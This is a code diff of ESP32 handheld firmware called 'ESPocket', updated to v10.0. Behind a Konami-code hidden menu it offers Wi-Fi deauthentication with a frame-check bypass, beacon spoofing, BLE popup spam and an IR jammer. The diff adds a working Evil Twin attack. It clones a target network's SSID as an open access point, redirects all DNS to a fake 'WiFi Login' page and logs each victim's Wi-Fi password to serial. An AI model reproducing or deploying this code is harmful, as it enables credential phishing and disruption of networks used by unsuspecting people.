@@ -1,5 +1,6 @@
 // ============================================================
-//  ESPocket v9.2 — getNative() dereference fix
+//  ESPocket v10.0 — FINAL BUILD
+//  Complete multitool: WiFi + BT + BLE + IR + Games + Tools
 // ============================================================
 
 #include <Wire.h>
@@ -8,6 +9,8 @@
 #include <math.h>
 #include <Preferences.h>
 #include <WiFi.h>
+#include <DNSServer.h>
+#include <WebServer.h>
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
 #include <BLEDevice.h>
@@ -18,7 +21,7 @@
 #include <IRrecv.h>
 #include <IRutils.h>
 
-// ---------- Deauth bypass ----------
+// Deauth bypass
 extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
   return 0;
 }
@@ -36,7 +39,6 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 
 #define IR_TX_PIN    13
 #define IR_RX_PIN    14
-
 #define BATT_ADC_PIN 34
 
 #define TEMP_CRIT    85.0f
@@ -46,14 +48,12 @@ IRsend irsend(IR_TX_PIN);
 IRrecv irrecv(IR_RX_PIN);
 decode_results irResults;
 
-// ---------- Hold ----------
 struct HoldState { bool down; unsigned long pressMs, lastRepeatMs; bool repeatActive; };
 #define HOLD_DELAY   450
 #define REPEAT_RATE  110
 HoldState hUp={false,0,0,false}, hDown={false,0,0,false};
 HoldState hSelect={false,0,0,false}, hBack={false,0,0,false};
 
-// ---------- Scene ----------
 enum Scene : uint8_t {
   S_MAIN, S_SONGS, S_PLAYER,
   S_BT_MENU, S_BT_SEARCH, S_BT_DEV, S_BT_CONN,
@@ -62,7 +62,7 @@ enum Scene : uint8_t {
   S_HIDDEN, S_WIFI_H, S_BT_H, S_IR_H,
   S_WIFI_SCAN, S_WIFI_TARGET, S_MOCK,
   S_IR_LEARN, S_IR_LIST, S_IR_TX, S_IR_JAM, S_IR_TVBG,
-  S_DEAUTH, S_BEACON, S_PROBE, S_RFMON,
+  S_DEAUTH, S_BEACON, S_PROBE, S_RFMON, S_EVIL,
   S_BLE_SCAN, S_BLE_SPAM, S_BLE_IBEACON
 };
 
@@ -75,12 +75,10 @@ unsigned long bootMs = 0;
 bool overheatLatched = false;
 float lastTempC = 0;
 
-// ---------- Main menu ----------
 const char* MAIN_IT[] = {"Play","Songs","Bluetooth","Games","LED Effects","Flashlight","Settings"};
 const int MAIN_COUNT = 7;
 int mainSel = 0;
 
-// ---------- Songs ----------
 struct Song { const char* title; const char* artist; uint16_t dur; };
 Song SONGS[] = {
   {"Tum Hi Ho","Arijit",262},{"Kesariya","Arijit",268},
@@ -89,7 +87,6 @@ Song SONGS[] = {
 const int SONG_COUNT = 4;
 int songSel = 0;
 
-// ---------- BT (mock) ----------
 const char* BT_M[] = {"Scan Devices","Connect Last","Forget Saved"};
 const int BT_M_COUNT = 3;
 int btMenuSel = 0;
@@ -106,7 +103,6 @@ const int DEV_COUNT = 5;
 int devSel = 0;
 int connDevIdx = 0;
 
-// ---------- LED ----------
 const char* LED_M[] = {"Effects","Music Sync","Brightness","WiFi Control"};
 const int LED_M_COUNT = 4;
 int ledMenuSel = 0;
@@ -117,21 +113,17 @@ const char* LM[] = {"Play Music","Music Bar","Music VU","Beat Pulse","Spectrum",
 const int LM_COUNT = 12;
 int lmSel = 0;
 
-// ---------- Settings ----------
 const char* SET_M[] = {"Display Sleep","Screen Bright","Auto BT","Factory Reset","About"};
 const int SET_COUNT = 5;
 int setSel = 0;
 
-// ---------- Games ----------
 const char* GAMES_M[] = {"Simon Says","Lights Out"};
 const int GAMES_COUNT = 2;
 int gamesSel = 0;
 
-// ---------- Prefs ----------
 Preferences prefs;
 int highScore = 0;
 
-// ---------- IR storage ----------
 #define IR_MAX_SLOTS  16
 #define IR_NAME_LEN   14
 struct IRCode { bool valid; uint8_t protocol; uint32_t code; uint8_t bits; char name[IR_NAME_LEN]; };
@@ -148,7 +140,6 @@ const int IR_PROTO_COUNT = 6;
 const char* IR_MENU[] = {"Learn Code","Transmit","Jammer","TV-B-Gone","Delete Slot"};
 const int IR_MENU_COUNT = 5;
 
-// ---------- Hidden ----------
 bool hiddenUnlocked = false;
 const char* HIDDEN_IT[]  = {"WiFi","BT","IR"};
 const char* HIDDEN_SUB[] = {"Wireless","Bluetooth","Infrared"};
@@ -163,7 +154,6 @@ const char* BT_H_M[] = {"BLE Scan","BLE Spam","iBeacon","HID Keyboard"};
 const int BT_H_COUNT = 4;
 int btHSel = 0;
 
-// ---------- WiFi nets ----------
 #define NET_MAX 20
 struct Net { char ssid[33]; uint8_t bssid[6]; int8_t rssi; uint8_t ch; bool locked; };
 Net NETS[NET_MAX];
@@ -176,12 +166,10 @@ const char* WIFI_ACT_M[] = {"Deauth","Evil Twin","Beacon Spoof","Probe Flood"};
 const int WIFI_ACT_COUNT = 4;
 int wifiActSel = 0;
 
-// ---------- Deauth ----------
 bool deauthRunning = false;
 unsigned long deauthStartMs = 0, deauthLast = 0, deauthCount = 0;
 #define DEAUTH_REASON 0x07
 
-// ---------- Beacon ----------
 bool beaconRunning = false;
 unsigned long beaconStartMs = 0, beaconLast = 0, beaconCount = 0;
 int beaconSSIDIdx = 0;
@@ -200,7 +188,6 @@ const char* FAKE_SSIDS[] = {
 };
 const int FAKE_SSID_COUNT = 40;
 
-// ---------- Probe Sniffer ----------
 #define PROBE_RING 8
 volatile uint8_t probeRingMac[PROBE_RING][6];
 volatile int8_t  probeRingRssi[PROBE_RING];
@@ -210,25 +197,24 @@ volatile int     probeRingHead = 0;
 volatile bool    snifferActive = false;
 
 #define PROBE_MAX 20
-struct ProbeDev {
-  uint8_t mac[6];
-  char ssid[24];
-  int8_t rssi;
-  uint16_t count;
-  unsigned long lastSeen;
-  bool used;
-};
+struct ProbeDev { uint8_t mac[6]; char ssid[24]; int8_t rssi; uint16_t count; unsigned long lastSeen; bool used; };
 ProbeDev probeDevices[PROBE_MAX];
 int probeDevCount = 0;
 uint32_t probeTotalCount = 0;
 
-// ---------- RF Monitor ----------
 int rfNetworkCount = 0, rfAvgRssi = 0, rfStrongest = -100, rfWeakest = -100;
 unsigned long rfLastScanMs = 0;
 uint8_t rfChanUsage[14] = {0};
 bool rfScanRunning = false;
 
-// ---------- BLE ----------
+// Evil Twin
+WebServer* evilServer = nullptr;
+DNSServer* evilDNS = nullptr;
+bool evilTwinRunning = false;
+unsigned long evilTwinStartMs = 0;
+int evilCaptured = 0;
+char evilSSID[33] = {0};
+
 #define BLE_MAX_DEVS 15
 struct BLEDevInfo { char name[24]; uint8_t addr[6]; int rssi; };
 BLEDevInfo bleDevs[BLE_MAX_DEVS];
@@ -242,24 +228,20 @@ unsigned long bleIbStart = 0;
 BLEScan* bleScan = nullptr;
 bool bleStackInit = false;
 
-// ---------- Mock attack screen ----------
 const char* mockTitle = "";
 const char* mockSub   = "";
 Scene mockReturnScene = S_HIDDEN;
 
-// ---------- Konami ----------
 int konamiProgress = 0;
 unsigned long konamiLastMs = 0;
 const int KONAMI_CODE[] = {0,1,0,1,2};
 const int KONAMI_LEN = 5;
 
-// ---------- Touch ----------
 int baseUp=0, baseDown=0, baseSelect=0, baseBack=0;
 #define TOUCH_DROP_PCT 25
 unsigned long lastInput = 0;
 #define INPUT_DEBOUNCE 30
 
-// ---------- Smooth ----------
 #define SMOOTH_RATE 14.0f
 float smPos = 0.0f;
 unsigned long smLastMs = 0;
@@ -269,12 +251,11 @@ void smTick(float t){unsigned long n=millis();if(smFirst){smPos=t;smLastMs=n;smF
 void smSnapNext(){smFirst=true;}
 int animFrame = 0;
 
-// ---------- Battery ----------
 int batteryPct = 0;
 unsigned long lastBattRead = 0;
 float battVoltage = 0.0f;
 
-// ---------- Icons ----------
+// Icons (compact set)
 void iPlay(int x,int y,uint16_t c){display.fillTriangle(x+2,y+1,x+2,y+7,x+7,y+4,c);}
 void iMusic(int x,int y,uint16_t c){display.fillCircle(x+2,y+5,2,c);display.drawFastVLine(x+3,y+1,5,c);display.drawPixel(x+4,y+1,c);display.drawPixel(x+5,y+1,c);display.drawPixel(x+6,y+2,c);display.drawPixel(x+6,y+3,c);display.drawPixel(x+5,y+3,c);}
 void iBT(int x,int y,uint16_t c){display.drawFastVLine(x+4,y,8,c);display.drawLine(x+4,y,x+6,y+2,c);display.drawLine(x+6,y+2,x+2,y+4,c);display.drawLine(x+4,y+7,x+6,y+5,c);display.drawLine(x+6,y+5,x+2,y+3,c);}
@@ -295,7 +276,6 @@ void iGearL(int x,int y,uint16_t c){display.drawCircle(x+8,y+8,4,c);display.draw
 void iWifi(int x,int y,uint16_t c){display.fillCircle(x+4,y+6,1,c);display.drawCircle(x+4,y+6,3,c);display.drawCircle(x+4,y+6,5,c);}
 void iWifiL(int x,int y,uint16_t c){display.fillCircle(x+8,y+12,2,c);display.drawCircle(x+8,y+12,5,c);display.drawCircle(x+8,y+12,9,c);}
 
-// ---------- Header + battery ----------
 void batD(int x,int y){display.drawRect(x,y,16,9,BLACK);display.fillRect(x+16,y+3,2,3,BLACK);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,BLACK);}
 void batL(int x,int y){display.drawRect(x,y,16,9,WHITE);display.fillRect(x+16,y+3,2,3,WHITE);int f=(batteryPct*12)/100;if(f>0)display.fillRect(x+2,y+2,f,5,WHITE);}
 void hdr(const char* t){int tw=strlen(t)*6;int hx=(SCR_W-(tw+8))/2;display.fillRoundRect(hx,0,tw+8,13,6,WHITE);display.setTextColor(BLACK);display.setTextSize(1);display.setCursor(hx+4,3);display.print(t);batD(SCR_W-22,2);display.setTextColor(WHITE);}
@@ -304,17 +284,13 @@ void drawSignalBars(int x,int y,int s,uint16_t c){for(int i=0;i<4;i++){int h=2+i
 float readTempC(){return temperatureRead();}
 void saveHighScore(int score){if(score>highScore){highScore=score;prefs.putInt("hi",highScore);}}
 
-// ---------- Battery funcs ----------
+// Battery
 float readBatteryVoltage() {
   uint32_t total = 0;
-  for (int i = 0; i < 32; i++) {
-    total += analogReadMilliVolts(BATT_ADC_PIN);
-    delay(5);
-  }
+  for (int i = 0; i < 32; i++) { total += analogReadMilliVolts(BATT_ADC_PIN); delay(5); }
   float mv = total / 32.0f;
   return (mv * 2.0f) / 1000.0f;
 }
-
 void batteryUpdate() {
   unsigned long now = millis();
   if (now - lastBattRead < 2000) return;
@@ -326,9 +302,8 @@ void batteryUpdate() {
   if (pct > 100) pct = 100;
   batteryPct = pct;
 }
-
 // ============================================================
-//  IR storage
+//  IR Storage
 // ============================================================
 void irSaveSlot(int slot){
   if(slot<0||slot>=IR_MAX_SLOTS)return;
@@ -376,7 +351,6 @@ void irSendJamBurst(){
   irJamCount++;irJamProtoIdx=(irJamProtoIdx+1)%IR_PROTO_COUNT;
 }
 
-// ---------- TV-B-Gone ----------
 struct TVCode { uint8_t proto; uint32_t code; uint8_t bits; };
 TVCode TV_BUILTIN[] = {
   {0,0x20DF10EF,32},{0,0x20DFC03F,32},{0,0x20DF23DC,32},
@@ -396,7 +370,6 @@ TVCode TV_BUILTIN[] = {
   {0,0x0808,16},{5,0x0C,13},{0,0x00FF8877,32}
 };
 const int TVBG_COUNT = sizeof(TV_BUILTIN)/sizeof(TVCode);
-
 void irSendTvbgCode(int idx){
   if(idx<0||idx>=TVBG_COUNT)return;
   TVCode t=TV_BUILTIN[idx];
@@ -508,11 +481,9 @@ void IRAM_ATTR probeSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
   uint8_t* f = pkt->payload;
   uint8_t subtype = (f[0] >> 4) & 0x0F;
   if (subtype != 0x04) return;
-
   int slot = probeRingHead;
   for (int i = 0; i < 6; i++) probeRingMac[slot][i] = f[10 + i];
   probeRingRssi[slot] = (int8_t)pkt->rx_ctrl.rssi;
-
   int idx = 24, slen = pkt->rx_ctrl.sig_len;
   probeRingSsid[slot][0] = 0;
   while (idx + 2 <= slen) {
@@ -529,7 +500,6 @@ void IRAM_ATTR probeSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
   probeRingValid[slot] = true;
   probeRingHead = (probeRingHead + 1) % PROBE_RING;
 }
-
 void probeProcessRing() {
   for (int s = 0; s < PROBE_RING; s++) {
     if (!probeRingValid[s]) continue;
@@ -540,7 +510,6 @@ void probeProcessRing() {
     for (int i = 0; i < 24; i++) ssid[i] = probeRingSsid[s][i];
     ssid[23] = 0;
     probeTotalCount++;
-
     int found = -1;
     for (int i = 0; i < PROBE_MAX; i++) {
       if (!probeDevices[i].used) continue;
@@ -567,7 +536,6 @@ void probeProcessRing() {
     }
   }
 }
-
 void snifferStart() {
   WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
   esp_wifi_set_promiscuous_rx_cb(probeSnifferCb);
@@ -587,7 +555,7 @@ void snifferStop() {
 }
 
 // ============================================================
-//  RF Monitor (async)
+//  RF Monitor
 // ============================================================
 void rfMonitorScan() {
   unsigned long now = millis();
@@ -601,7 +569,6 @@ void rfMonitorScan() {
   }
   int n = WiFi.scanComplete();
   if (n < 0) return;
-
   rfNetworkCount = n;
   rfStrongest = -100; rfWeakest = -100; rfAvgRssi = 0;
   for (int i = 0; i < 14; i++) rfChanUsage[i] = 0;
@@ -622,6 +589,102 @@ void rfMonitorScan() {
 }
 
 // ============================================================
+//  EVIL TWIN — real captive portal
+// ============================================================
+const char PORTAL_HTML[] PROGMEM = R"HTML(
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WiFi Login</title>
+<style>
+body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.c{background:#fff;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.1);padding:32px;max-width:340px;width:90%}
+h2{margin:0 0 8px;color:#1a1a1a}
+p{color:#666;font-size:14px;margin:0 0 24px}
+input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:16px}
+button{width:100%;padding:14px;background:#0066cc;color:#fff;border:0;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#0052a3}
+.f{margin-top:16px;font-size:12px;color:#999;text-align:center}
+</style></head><body>
+<div class="c">
+<h2>WiFi Login</h2>
+<p>Enter your WiFi password to continue</p>
+<form action="/login" method="POST">
+<input type="password" name="pw" placeholder="WiFi password" required autofocus>
+<button type="submit">Connect</button>
+</form>
+<div class="f">Secure connection</div>
+</div></body></html>
+)HTML";
+
+const char PORTAL_OK[] PROGMEM = R"HTML(
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>Connected</title>
+<style>body{font-family:Arial;text-align:center;padding:60px 20px;background:#f0f2f5}
+h2{color:#00aa00}p{color:#666}</style></head><body>
+<h2>Connected</h2><p>You may close this window now.</p>
+</body></html>
+)HTML";
+
+void evilHandleRoot() {
+  if (evilServer) evilServer->send_P(200, "text/html", PORTAL_HTML);
+}
+void evilHandleLogin() {
+  if (!evilServer) return;
+  String pw = evilServer->arg("pw");
+  evilCaptured++;
+  Serial.printf("[EVIL] *** CAPTURED #%d: %s ***\n", evilCaptured, pw.c_str());
+  evilServer->send_P(200, "text/html", PORTAL_OK);
+  delay(100);
+}
+void evilHandleAny() {
+  if (evilServer) evilServer->send_P(200, "text/html", PORTAL_HTML);
+}
+
+void evilTwinStart(int netIdx) {
+  if (netIdx < 0 || netIdx >= NET_COUNT) return;
+  esp_wifi_set_promiscuous(false);
+  delay(50);
+
+  // Save SSID
+  strncpy(evilSSID, NETS[netIdx].ssid, 32);
+  evilSSID[32] = 0;
+  evilCaptured = 0;
+
+  // Start fake AP
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(evilSSID, nullptr, NETS[netIdx].ch, 0, 4);
+  IPAddress ip = WiFi.softAPIP();
+  Serial.printf("[EVIL] AP '%s' started at %s ch=%d\n", evilSSID, ip.toString().c_str(), NETS[netIdx].ch);
+
+  // DNS server — redirect all to our IP
+  evilDNS = new DNSServer();
+  evilDNS->start(53, "*", ip);
+
+  // HTTP server on port 80
+  evilServer = new WebServer(80);
+  evilServer->on("/", evilHandleRoot);
+  evilServer->on("/login", HTTP_POST, evilHandleLogin);
+  evilServer->onNotFound(evilHandleAny);
+  evilServer->begin();
+
+  evilTwinRunning = true;
+  evilTwinStartMs = millis();
+}
+void evilTwinStop() {
+  if (evilServer) { evilServer->stop(); delete evilServer; evilServer = nullptr; }
+  if (evilDNS) { evilDNS->stop(); delete evilDNS; evilDNS = nullptr; }
+  evilTwinRunning = false;
+  WiFi.softAPdisconnect(true);
+  WiFi.mode(WIFI_OFF);
+  Serial.printf("[EVIL] stopped, captured=%d\n", evilCaptured);
+}
+void evilTwinTick() {
+  if (!evilTwinRunning) return;
+  if (evilDNS) evilDNS->processNextRequest();
+  if (evilServer) evilServer->handleClient();
+}
+
+// ============================================================
 //  BLE
 // ============================================================
 class BLEAdvertisedCallbacks : public BLEAdvertisedDeviceCallbacks {
@@ -632,13 +695,12 @@ class BLEAdvertisedCallbacks : public BLEAdvertisedDeviceCallbacks {
     strncpy(bleDevs[bleDevCount].name, name.c_str(), 23);
     bleDevs[bleDevCount].name[23] = 0;
     BLEAddress addr = dev.getAddress();
-    uint8_t* a = *addr.getNative();   // FIX: dereference array pointer
+    uint8_t* a = *addr.getNative();
     for (int i = 0; i < 6; i++) bleDevs[bleDevCount].addr[i] = a[i];
     bleDevs[bleDevCount].rssi = dev.getRSSI();
     bleDevCount++;
   }
 };
-
 void bleEnsureInit() {
   if (bleStackInit) return;
   BLEDevice::init("ESPocket");
@@ -652,7 +714,6 @@ void bleDeinit() {
   bleScan = nullptr;
   Serial.println("[BLE] stack deinit");
 }
-
 void bleStartScan() {
   WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
   bleEnsureInit();
@@ -666,7 +727,6 @@ void bleStartScan() {
   bleScan->start(3, false);
   Serial.println("[BLE] scan started");
 }
-
 void bleSendApplePopup() {
   BLEAdvertisementData advData;
   advData.setFlags(0x06);
@@ -682,7 +742,6 @@ void bleSendApplePopup() {
   adv->start(); delay(8); adv->stop();
   bleSpamCount++;
 }
-
 void bleSendSamsungPopup() {
   BLEAdvertisementData advData;
   advData.setFlags(0x06);
@@ -696,7 +755,6 @@ void bleSendSamsungPopup() {
   adv->start(); delay(8); adv->stop();
   bleSpamCount++;
 }
-
 void bleSendMicrosoftPopup() {
   BLEAdvertisementData advData;
   advData.setFlags(0x06);
@@ -711,7 +769,6 @@ void bleSendMicrosoftPopup() {
   adv->start(); delay(8); adv->stop();
   bleSpamCount++;
 }
-
 void bleStartSpam() {
   WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
   bleEnsureInit();
@@ -743,12 +800,10 @@ void bleStopSpam() {
   Serial.printf("[BLE] spam stopped, %lu packets\n", bleSpamCount);
   bleDeinit();
 }
-
 void bleStartIBeacon() {
   WiFi.mode(WIFI_OFF); WiFi.disconnect(true); delay(50);
   bleEnsureInit();
   bleIbRunning = true; bleIbStart = millis();
-
   BLEAdvertisementData advData;
   advData.setFlags(0x06);
   std::string mfg;
@@ -763,7 +818,6 @@ void bleStartIBeacon() {
   mfg += (char)0x00; mfg += (char)0x01;
   mfg += (char)0xC5;
   advData.setManufacturerData(mfg);
-
   BLEAdvertising* adv = BLEDevice::getAdvertising();
   adv->setAdvertisementData(advData);
   adv->start();
@@ -1169,7 +1223,7 @@ void dAbout() {
   hdrL("ABOUT");
   display.setTextSize(1); display.setTextColor(WHITE);
   lastTempC = readTempC();
-  display.setCursor(4, 16); display.print("ESPocket v9.2");
+  display.setCursor(4, 16); display.print("ESPocket v10.0");
   display.setCursor(4, 26); display.print("ESP32-WROOM-32");
   display.setCursor(4, 36); display.print("Temp: "); display.print(lastTempC, 1); display.print(" C");
   unsigned long up=(millis()-bootMs)/1000UL;
@@ -1248,15 +1302,12 @@ void dBtH()   { smTick((float)btHSel);   dCyberList(btHSel,"BT_OPS",BT_H_M,BT_H_
 
 void dWifiScan() {
   if (!wifiScanRunning && !wifiScanDone) {
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    delay(50);
+    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
     WiFi.scanNetworks(true);
     wifiScanRunning = true;
     sceneStartMs = millis();
     Serial.println("[WIFI] scan started");
   }
-
   if (!wifiScanDone) {
     int n = WiFi.scanComplete();
     display.clearDisplay();
@@ -1285,7 +1336,6 @@ void dWifiScan() {
       display.print(b);
     }
     display.display();
-
     if (n >= 0) {
       NET_COUNT = (n < NET_MAX) ? n : NET_MAX;
       for (int i = 0; i < NET_COUNT; i++) {
@@ -1309,7 +1359,6 @@ void dWifiScan() {
     }
     return;
   }
-
   if (NET_COUNT == 0) {
     display.clearDisplay();
     hdrL("NETWORKS");
@@ -1318,7 +1367,6 @@ void dWifiScan() {
     display.display();
     return;
   }
-
   const int visRows=3,rowH=12,baseY=18;
   int targetOff=(netSel>=2)?(netSel-1):0;
   if(targetOff+visRows>NET_COUNT)targetOff=NET_COUNT-visRows;
@@ -1511,12 +1559,32 @@ void dRfMon() {
   display.display();
 }
 
-// BLE screens
+void dEvil() {
+  unsigned long now = millis();
+  evilTwinTick();
+  display.clearDisplay();
+  hdr("EVIL TWIN");
+  display.setTextSize(1); display.setTextColor(WHITE);
+  display.setCursor(2, 14); display.print("SSID: ");
+  display.print(evilSSID);
+  display.setCursor(2, 26); display.print("IP: 192.168.4.1");
+  display.setCursor(2, 38);
+  char b[24]; snprintf(b, sizeof(b), "Captured: %d", evilCaptured);
+  display.print(b);
+  unsigned long el = (now - evilTwinStartMs) / 1000;
+  display.setCursor(2, 50);
+  snprintf(b, sizeof(b), "Time: %lus", el);
+  display.print(b);
+  if ((animFrame/3)%2==0) display.fillCircle(SCR_W-8, 6, 3, WHITE);
+  else                    display.drawCircle(SCR_W-8, 6, 3, WHITE);
+  display.setCursor(2, 58); display.print("BACK=stop");
+  display.display();
+}
+
 void dBleScan() {
   if (bleScanRunning && millis() - sceneStartMs > 4000) {
     if (bleScan) { bleScan->stop(); bleScan->clearResults(); }
-    bleScanRunning = false;
-    bleScanDone = true;
+    bleScanRunning = false; bleScanDone = true;
     Serial.printf("[BLE] scan done, %d devices\n", bleDevCount);
     bleDeinit();
   }
@@ -1611,8 +1679,7 @@ void dMock() {
   display.drawRect(bx,26,bw,6,WHITE);
   int p=(animFrame*3)%100;
   display.fillRect(bx+1,27,(p*(bw-2))/100,4,WHITE);
-  display.setCursor(6,38);
-  display.print("[ RUNNING ]");
+  display.setCursor(6,38);display.print("[ RUNNING ]");
   display.setCursor(4,58);display.print("BACK = return");
   display.display();
 }
@@ -1840,10 +1907,7 @@ void handleSelect(){
       if (btHSel == 0) { bleStartScan(); goToScene(S_BLE_SCAN); }
       else if (btHSel == 1) { bleStartSpam(); goToScene(S_BLE_SPAM); }
       else if (btHSel == 2) { bleStartIBeacon(); goToScene(S_BLE_IBEACON); }
-      else {
-        mockTitle = "BT_OPS"; mockSub = BT_H_M[btHSel];
-        mockReturnScene = S_BT_H; goToScene(S_MOCK);
-      }
+      else { mockTitle="BT_OPS"; mockSub=BT_H_M[btHSel]; mockReturnScene=S_BT_H; goToScene(S_MOCK); }
       break;
     case S_IR_H:
       if(irSel==0){irLearnSlot=0;irrecv.enableIRIn();irrecv.resume();goToScene(S_IR_LEARN);}
@@ -1853,12 +1917,11 @@ void handleSelect(){
       else if(irSel==4){irListSel=0;goToScene(S_IR_LIST);}
       break;
     case S_WIFI_SCAN:
-      if(wifiScanDone && NET_COUNT > 0){
-        targetNet=netSel;wifiActSel=0;goToScene(S_WIFI_TARGET);
-      }
+      if(wifiScanDone && NET_COUNT > 0){ targetNet=netSel;wifiActSel=0;goToScene(S_WIFI_TARGET); }
       break;
     case S_WIFI_TARGET:
       if (wifiActSel == 0) { deauthStart(targetNet); goToScene(S_DEAUTH); }
+      else if (wifiActSel == 1) { evilTwinStart(targetNet); goToScene(S_EVIL); }
       else {
         mockTitle=WIFI_ACT_M[wifiActSel];
         mockSub=NETS[targetNet].ssid;
@@ -1901,11 +1964,9 @@ void handleBack(){
     case S_BT_H:goToScene(S_HIDDEN);break;
     case S_IR_H:goToScene(S_HIDDEN);break;
     case S_WIFI_SCAN:
-      WiFi.scanDelete();
-      WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
+      WiFi.scanDelete(); WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
       wifiScanRunning = false;
-      goToScene(S_WIFI_H);
-      break;
+      goToScene(S_WIFI_H); break;
     case S_WIFI_TARGET:goToScene(S_WIFI_SCAN);break;
     case S_MOCK:goToScene(mockReturnScene);break;
     case S_IR_LEARN:goToScene(S_IR_H);break;
@@ -1919,13 +1980,12 @@ void handleBack(){
     case S_RFMON:
       WiFi.scanDelete(); WiFi.mode(WIFI_OFF); WiFi.disconnect(true);
       rfScanRunning = false;
-      goToScene(S_WIFI_H);
-      break;
+      goToScene(S_WIFI_H); break;
+    case S_EVIL:evilTwinStop();goToScene(S_WIFI_TARGET);break;
     case S_BLE_SCAN:
       if (bleScan) bleScan->stop();
       bleDeinit();
-      goToScene(S_BT_H);
-      break;
+      goToScene(S_BT_H); break;
     case S_BLE_SPAM:bleStopSpam();goToScene(S_BT_H);break;
     case S_BLE_IBEACON:bleStopIBeacon();goToScene(S_BT_H);break;
   }
@@ -1999,7 +2059,7 @@ void checkOverheat(){
 // ============================================================
 void setup(){
   Serial.begin(115200);delay(300);
-  Serial.println("\n[BOOT] ESPocket v9.2");
+  Serial.println("\n[BOOT] ESPocket v10.0");
 
   Wire.begin(OLED_SDA,OLED_SCL);
   Wire.setClock(400000);
@@ -2024,7 +2084,6 @@ void setup(){
   irLoadAll();
   Serial.printf("[IR] %d slots valid\n",irCountValid());
 
-  // Battery ADC
   analogSetAttenuation(ADC_11db);
   analogSetPinAttenuation(BATT_ADC_PIN, ADC_11db);
   analogReadResolution(12);
@@ -2084,6 +2143,7 @@ void loop(){
       case S_BEACON:dBeacon();break;
       case S_PROBE:dProbe();break;
       case S_RFMON:dRfMon();break;
+      case S_EVIL:dEvil();break;
       case S_BLE_SCAN:dBleScan();break;
       case S_BLE_SPAM:dBleSpam();break;
       case S_BLE_IBEACON:dBleIBeacon();break;
